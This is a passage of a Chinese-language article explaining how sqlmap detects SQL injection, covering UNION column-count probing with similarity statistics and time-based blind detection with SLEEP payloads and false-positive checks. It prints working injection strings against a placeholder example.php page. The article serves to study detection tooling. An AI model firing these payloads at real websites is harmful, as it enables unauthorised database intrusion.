在上述漏洞场景中，进行union注入案例分析。
首先看一下原始请求：
    example.php?id=1
可以成功注入的测试向量：
        Generic UNION query (NULL) - 1 to 10 columns
        ...
            [GENERIC_SQL_COMMENT]
            NULL
            1-10
根据测试向量，我们可以知道猜测列数的最大值为10，最小值为1。此处，笔者跳过使用order by技术探测列数，使用select null技术进行列数探测。
猜测列数的范围为1-10，因此发送10个数据包，第一个数据包：
    example.php?id=1 UNION ALL SELECT NULL-- fVTK
这个数据包的网页相似度数值为0.714，第二个数据包：
    example.php?id=1 UNION ALL SELECT NULL,NULL-- jmEt
这个数据包的网页相似度数值为0.726，第三个数据包：
    example.php?id=1 UNION ALL SELECT NULL,NULL,NULL-- cRud
这个数据包的网页相似度数值为0.834，第四个数据包：
    example.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL-- AqEV
这个数据包的网页相似度数值为0.716，第五个数据包：
    example.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- NvIh
这个数据包的网页相似度数值为0.71，第六个数据包：
    example.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- qrAS
这个数据包的网页相似度数值为0.723，第七个数据包：
    example.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mmxs
这个数据包的网页相似度数值为0.724，第八个数据包：
    example.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- moNa
这个数据包的网页相似度数值为0.723，第九个数据包：
    example.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vHbn
这个数据包的网页相似度数值为0.725，第十个数据包：
    example.php?id=1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bVyF
这个数据包的网页相似度数值为0.722。
得到十个网页相似度数值，其中最大值为0.834，最小值为0.71，去除最大值最小值后，通过剩余的8个数据计算标准差为0.00430738568375，均值为0.721625。
  * 上边界 = 均值 + 7 * 标准差 = 0.751776699786
  * 下边界 = 均值 - 7 * 标准差 = 0.691473300214
这意味着，网页相似度值大于上边界或者小于下边界，就是成功找到的列数，0.834对应的NULL的数量就是列数，为3。至此，列数探测成功。
接下来使用select null技术来确定字符串位置，三列中随机找一个位置，插入字符串拼接语法，观察响应是否能够正确回显特定字符串，数据包如下：
    example.php?id=1 UNION ALL SELECT NULL,CONCAT(0x71707a7a71,0x625448774650554f4d435a696567784762446b776b5a53646c567a475259776c586a53694e675267,0x7178767671),NULL-- VdhL
可以观察到，回显成功。至此，字符串位置已确定，union注入存在。
## sqlmap检测之时间盲注
### 时间盲注主要流程
上图为时间盲注流程图，虚线之上表示前置发包过程，虚线之下表示针对每个注入点，都会进行循环发包的流程。
时间盲注过程中大量使用响应延迟判断技术，从流程图中可以看到，在针对每一个注入点循环发包时候，一共使用了三次响应延迟判断技术。
误报检测逻辑在前置发包部分已有说明，后续会针对漏洞环境的发包进行分析。
#### 响应延迟判断技术
响应延迟判断技术使用了高斯分布（正态分布，详见select
null列数探测技术）。在sqlmap时间盲注的测试向量库中，有包含准确的延迟时间如`[SLEEPTIME]`变量和进行大量计算进行延迟的`[DELAY]`等两种payload。高斯分布可以识别一个响应是否与普通响应产生于一种机制，因此，`[SLEEPTIME]`和`[DELAY]`就可以放在一种情况进行讨论，因为salmap区分的是响应机制。
### 时间盲注案例分析
在上述漏洞场景中，进行时间盲注案例分析。
首先看一下原始请求：
    example.php?id=1
可以成功注入的测试向量：
        MySQL >= 5.0.12 AND time-based blind
        ...
        AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
            AND SLEEP([SLEEPTIME])
            [SLEEPTIME]
            MySQL
             >= 5.0.12
在进入正式测试之前，由于响应延迟判断技术需要大量的正常响应作为高斯分布建模的数据，因此sqlmap会发送30次原始请求作为数据源。
根据测试向量，将`[SLEEPTIME]`随机生成一个数字，生成的数据包如下：
    example.php?id=1 AND SLEEP(5)
发送该请求后，响应发生了延迟。此时，sqlmap将`[SLEEPTIME]`值设置为0，生成的数据包如下：
    example.php?id=1 AND SLEEP(0)
发送该请求后，响应未发生延迟。sqlmap将`[SLEEPTIME]`值设置为第一次发包的值，生成的逻辑真数据包如下：
    example.php?id=1 AND SLEEP(5)
发送该请求后，响应发生了延迟。至此，sqlmap认为注入存在，接下来进入误报检测环节。
在时间盲注误报检测中，会生成三个不同的数字，并有这些数字组成不同的逻辑，把这些逻辑替换测试向量中原有的逻辑，并观察响应是否如预期。回顾一下测试向量，其中包含一个``标签，标签中的`[INFERENCE]`就是三个数字逻辑替换的地方。
看一下误报检测流程图，一共有五个误报检测逻辑，在实际情况中分别为：
    example.php?id=1 AND 9187=IF((19=19),SLEEP(5),9187)
响应发生了延迟。第二个逻辑：
    example.php?id=1 AND 7052=IF((19=55),SLEEP(5),7052)
响应未发生延迟。第三个逻辑：
    example.php?id=1 AND 1148=IF((19=58),SLEEP(5),1148)
响应未发生延迟。第四个逻辑：
    example.php?id=1 AND 6574=IF((55=55),SLEEP(5),6574)
响应发生了延迟。第五个逻辑：
    example.php?id=1 AND 4482=IF((58 55),SLEEP(5),4482)
响应未发生延迟。至此，误报检测完成，确定注入存在。
## 总结
非常感谢！能够看到总结不易，深入研究技术也不易。希望本文对想要阅读sqlmap源码的人和专注于SQL注入自动化检测的人能够有所启发。
* * *